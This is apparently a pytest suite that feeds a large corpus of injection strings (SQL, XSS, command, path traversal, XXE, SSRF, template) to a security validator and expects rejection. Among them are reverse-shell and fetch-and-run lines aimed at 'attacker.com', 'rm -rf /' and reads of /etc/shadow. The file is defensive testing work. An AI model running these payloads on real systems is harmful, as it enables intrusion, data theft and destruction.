#!/usr/bin/env python3
"""
ULTRA-PARANOID Security Testing
Testing every possible attack vector with extreme prejudice
"""

import pytest
import random
import string
import itertools
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from src.core.security_validator import SecurityValidator


class TestUltraParanoidSecurity:
    """
    Security tests that are ACTUALLY paranoid.
    Not just checking happy paths - actively trying to break things.
    """

    @classmethod
    def setup_class(cls):
        cls.validator = SecurityValidator()
        cls.generate_attack_corpus()

    @classmethod
    def generate_attack_corpus(cls):
        """Generate a massive corpus of attack strings"""
        cls.attack_strings = []

        # SQL Injection variants - not just basic ones
        sql_attacks = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords --",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "' OR '1'='1' /*",
            "1' AND '1' = '1",
            "' AND id IS NULL; --",
            "' AND 1=(SELECT COUNT(*) FROM tabname); --",
            "' AND 1=1 AND 'a'='a",
            "1' AND non_existant_table = '1",
            "' OR username LIKE '%",
            "' OR userid LIKE '%",
            "' OR '1'='1",
            "'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
            "' UNION ALL SELECT NULL--",
            "' AND 1=0 UNION ALL SELECT '',''",
            "1' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1)) > 116",
            "' UNION SELECT NULL, NULL, NULL--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "';WAITFOR DELAY '00:00:05'--",
            "';SELECT pg_sleep(5)--",
            "' OR 1=1 LIMIT 1 -- ' ]",
            chr(0) + "' OR '1'='1",  # Null byte injection
            "' OR '1'='1\x00--",  # Null byte termination
            "' OR '1'='1%00--",  # URL encoded null
        ]
        cls.attack_strings.extend(sql_attacks)

        # XSS attacks - comprehensive
        xss_attacks = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input type='image' src=x onerror=alert(1)>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<table background='javascript:alert(1)'>",
            "<div style='background-image: url(javascript:alert(1))'>",
            "<div style='width: expression(alert(1))'>",
            "<!--[if IE]><script>alert(1)</script><![endif]-->",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
            "<svg><script>123<1>alert(123)</script>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<script>alert(1)//",
            "<script>alert(1)<!--",
            "<script>alert(1)%0d%0a</script>",
            "<script>alert(1);</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "java\nscript:alert(1)",
            "java\rscript:alert(1)",
            "java\tscript:alert(1)",
            "jav&#x09;ascript:alert(1)",
            "jav&#x0a;ascript:alert(1)",
            "jav&#x0d;ascript:alert(1)",
        ]
        cls.attack_strings.extend(xss_attacks)

        # Command injection - extensive
        cmd_attacks = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "&& ls -la",
            "|| ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; rm -rf /",
            "| rm -rf /",
            "& del /f /q *",
            "; format c:",
            "| shutdown /s /t 0",
            "\n/bin/ls -al\n",
            "%0a/bin/ls -al%0a",
            "|nslookup attacker.com",
            "|echo 'test' > /tmp/test",
            ";cat /etc/passwd",
            "|cat /etc/shadow",
            ";wget http://attacker.com/shell.sh",
            "|curl http://attacker.com/shell.sh|sh",
            ";nc -e /bin/sh attacker.com 4444",
            "a);cat /etc/passwd",
            "a;cat /etc/passwd",
            "a);cat /etc/passwd;",
            'a";cat /etc/passwd"',
            "a`cat /etc/passwd`",
            "a$(cat /etc/passwd)",
            chr(0) + ";cat /etc/passwd",  # Null byte prefix
            ";cat /etc/passwd" + chr(0),  # Null byte suffix
        ]
        cls.attack_strings.extend(cmd_attacks)

        # Path traversal - thorough
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..//..//..//etc/passwd",
            "..\\..\\..\\ windows\\system32\\config\\sam",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\..\\windows\\system32\\config\\sam",
            "..%00/etc/passwd",  # Null byte bypass
            "....//etc/passwd",
            "file:///etc/passwd",
            "file://c:/windows/system32/config/sam",
        ]
        cls.attack_strings.extend(path_attacks)

        # LDAP injection
        ldap_attacks = [
            "*",
            "*|",
            "*(|(objectclass=*))",
            "*)(uid=*",
            "*)(|(uid=*",
            ")(cn=))(|(cn=",
            "*()|&",
            "admin*",
            "admin*)(|(objectclass=*",
            "*)(uid=*))((uid=*",
        ]
        cls.attack_strings.extend(ldap_attacks)

        # NoSQL injection
        nosql_attacks = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$or": []}',
            '{"$where": "1 == 1"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}}',
            '{"$where": "function() { return true; }"}',
            "';return 'a'=='a' && ''=='",
            "';return ''=='';",
            '{"$nin": []}',
            '{"$exists": true}',
        ]
        cls.attack_strings.extend(nosql_attacks)

        # XML/XXE injection
        xml_attacks = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
            "<![CDATA[<script>alert(1)</script>]]>",
            '<?xml version="1.0"?><test><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></test>',
        ]
        cls.attack_strings.extend(xml_attacks)

        # Format string attacks
        format_attacks = [
            "%x%x%x%x",
            "%s%s%s%s",
            "%d%d%d%d",
            "%n%n%n%n",
            "%.1024d",
            "%*.*s",
            "%99999999999s",
            "%%%%%%%%%%%%%%%%%%%",
        ]
        cls.attack_strings.extend(format_attacks)

        # Unicode/encoding attacks
        unicode_attacks = [
            "\u202e\u0041\u0042\u0043",  # Right-to-left override
            "\ufeff\u200b\u200c\u200d",  # Zero-width characters
            "test\x00after",  # Null byte injection
            "\ud800\udc00",  # Invalid surrogate pairs
            "\uffff\ufffe",  # Non-characters
            "A" + "\u0301" * 100,  # Excessive combining characters
            "\u0000\u0001\u0002\u0003",  # Control characters
            "normaltext\u202etxt.exe",  # RLO extension spoofing
        ]
        cls.attack_strings.extend(unicode_attacks)

    @pytest.mark.timeout(15)
    def test_sql_injection_bombardment(self):
        """Test every SQL injection pattern we can think of"""
        for attack in [s for s in self.attack_strings if "OR" in s or "UNION" in s or "--" in s]:
            with pytest.raises(Exception):  # Should raise SecurityError
                self.validator.validate_string(attack, "sql_test")

    @pytest.mark.timeout(15)
    def test_xss_injection_bombardment(self):
        """Test every XSS pattern"""
        for attack in [s for s in self.attack_strings if "<" in s or "script" in s.lower()]:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "xss_test")

    @pytest.mark.timeout(15)
    def test_command_injection_bombardment(self):
        """Test command injection patterns"""
        for attack in [s for s in self.attack_strings if ";" in s or "|" in s or "`" in s]:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "cmd_test")

    @pytest.mark.timeout(15)
    def test_path_traversal_bombardment(self):
        """Test path traversal patterns"""
        for attack in [s for s in self.attack_strings if ".." in s or "etc/passwd" in s]:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "path_test")

    @pytest.mark.timeout(15)
    def test_combination_attacks(self):
        """Test combinations of multiple attack vectors"""
        # Combine different attack types
        for sql in ["' OR '1'='1", "'; DROP TABLE users; --"]:
            for xss in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                combined = sql + xss
                with pytest.raises(Exception):
                    self.validator.validate_string(combined, "combo_test")

    @pytest.mark.timeout(15)
    def test_fuzz_random_strings(self):
        """Fuzz with completely random strings"""
        random.seed(42)  # Reproducible
        for _ in range(1000):
            # Generate random string with various characters
            length = random.randint(1, 500)
            chars = string.printable + "".join(chr(i) for i in range(256))
            random_str = "".join(random.choice(chars) for _ in range(length))

            try:
                self.validator.validate_string(random_str, "fuzz_test")
            except Exception:
                pass  # Expected for malicious patterns

    @pytest.mark.timeout(15)
    def test_length_attacks(self):
        """Test various length-based attacks"""
        # Extremely long strings
        long_attacks = [
            "A" * 10000,  # Simple repetition
            "SELECT " + "A" * 10000 + " FROM users",  # SQL with long payload
            "<script>" + "A" * 10000 + "</script>",  # XSS with long payload
            "../" * 5000 + "etc/passwd",  # Path traversal with repetition
        ]

        for attack in long_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "length_test")

    @pytest.mark.timeout(15)
    def test_encoding_attacks(self):
        """Test various encoding bypass attempts"""
        encoding_attacks = [
            "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded
            "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML entities
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",  # Hex encoding
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  # Base64
            "\u003cscript\u003ealert(1)\u003c/script\u003e",  # Unicode escape
        ]

        for attack in encoding_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "encoding_test")

    @pytest.mark.timeout(15)
    def test_recursive_attacks(self):
        """Test recursive/nested attack patterns"""
        recursive_attacks = [
            "<script><script>alert(1)</script></script>",
            "';';';';DROP TABLE users;--",
            "..//..//..//..//etc/passwd",
            "{{{{{{{{{{template}}}}}}}}}}",
        ]

        for attack in recursive_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "recursive_test")

    @pytest.mark.timeout(15)
    def test_polyglot_attacks(self):
        """Test polyglot payloads that work in multiple contexts"""
        # Complex polyglot attacks that work across multiple injection contexts
        polyglot_attacks = [
            # JavaScript + HTML polyglot
            "'><script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "javascript:alert(1)",
            # SQL + XSS polyglot
            "' OR '1'='1' -- <script>alert(1)</script>",
            # Multiple escape contexts
            "';alert(1);//",
            '";alert(1);//',
        ]

        for attack in polyglot_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "polyglot_test")

    @pytest.mark.timeout(15)
    def test_timing_attacks(self):
        """Test timing-based SQL injection patterns"""
        timing_attacks = [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,SHA1(1))--",
            "';WAITFOR DELAY '00:00:05'--",
            "';SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]

        for attack in timing_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "timing_test")

    @pytest.mark.timeout(15)
    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization vulnerabilities"""
        # Different representations of the same character
        normalization_attacks = [
            "ﬁle:///etc/passwd",  # Ligature fi
            "Ⓐdmin",  # Circled letters
            "𝐀𝐝𝐦𝐢𝐧",  # Mathematical alphanumeric
            "Ａｄｍｉｎ",  # Fullwidth
            "test" + chr(0x200B) + "admin",  # Zero-width space
            "test" + chr(0xFEFF) + "admin",  # Zero-width no-break space
        ]

        for attack in normalization_attacks:
            result = self.validator.validate_string(attack, "unicode_test")
            # Should normalize these properly
            assert chr(0x200B) not in result
            assert chr(0xFEFF) not in result

    @pytest.mark.timeout(15)
    def test_header_injection(self):
        """Test HTTP header injection attacks"""
        header_attacks = [
            "test\r\nSet-Cookie: admin=true",
            "test\nLocation: http://evil.com",
            "test\r\n\r\n<script>alert(1)</script>",
            "test%0d%0aSet-Cookie:%20admin=true",
        ]

        for attack in header_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "header_test")

    @pytest.mark.timeout(15)
    def test_regex_dos_patterns(self):
        """Test ReDoS (Regular Expression DoS) patterns"""
        redos_patterns = [
            "a" * 100 + "X",
            "(a+)+" * 10,
            "((a*)*)*b",
            "(a*)*$",
            "(.*)*X",
        ]

        for pattern in redos_patterns:
            with pytest.raises(Exception):
                self.validator.validate_string(pattern, "redos_test")

    @pytest.mark.timeout(15)
    def test_billion_laughs_attack(self):
        """Test XML billion laughs / exponential entity expansion"""
        xml_bomb = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>"""

        with pytest.raises(Exception):
            self.validator.validate_string(xml_bomb, "xml_bomb_test")

    @pytest.mark.timeout(15)
    def test_graphql_injection(self):
        """Test GraphQL injection patterns"""
        graphql_attacks = [
            "{ __schema { types { name } } }",
            '{ __type(name: "User") { fields { name } } }',
            "mutation { deleteAllUsers }",
            '{ users(where: "1=1") { password } }',
        ]

        for attack in graphql_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "graphql_test")

    @pytest.mark.timeout(15)
    def test_template_injection(self):
        """Test template injection attacks"""
        template_attacks = [
            "{{7*7}}",  # Basic math
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__[2].__subclasses__()}}",  # Python
            "${__import__('os').system('ls')}",
        ]

        for attack in template_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "template_test")

    @pytest.mark.timeout(15)
    def test_ssrf_patterns(self):
        """Test SSRF (Server-Side Request Forgery) patterns"""
        ssrf_attacks = [
            "http://localhost/admin",
            "http://127.0.0.1/admin",
            "http://[::1]/admin",
            "http://169.254.169.254/",  # AWS metadata
            "file:///etc/passwd",
            "gopher://localhost:8080",
            "dict://localhost:11211",
            "sftp://evil.com",
            "ldap://localhost",
        ]

        for attack in ssrf_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "ssrf_test")

    @pytest.mark.timeout(15)
    def test_cache_poisoning_patterns(self):
        """Test cache poisoning attack patterns"""
        cache_attacks = [
            "test\r\nX-Forwarded-Host: evil.com",
            "test%0d%0aX-Forwarded-For:%20evil.com",
            "test\nCache-Control: no-transform",
        ]

        for attack in cache_attacks:
            with pytest.raises(Exception):
                self.validator.validate_string(attack, "cache_test")

    @pytest.mark.timeout(15)
    def test_integer_overflow_patterns(self):
        """Test integer overflow patterns"""
        integer_attacks = [
            "9" * 100,  # Very large number
            "-9" * 100,  # Very large negative
            "2147483648",  # Just over max int32
            "-2147483649",  # Just under min int32
            "18446744073709551616",  # Over max uint64
        ]

        for attack in integer_attacks:
            # Should handle large numbers safely
            self.validator.validate_string(attack, "integer_test")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
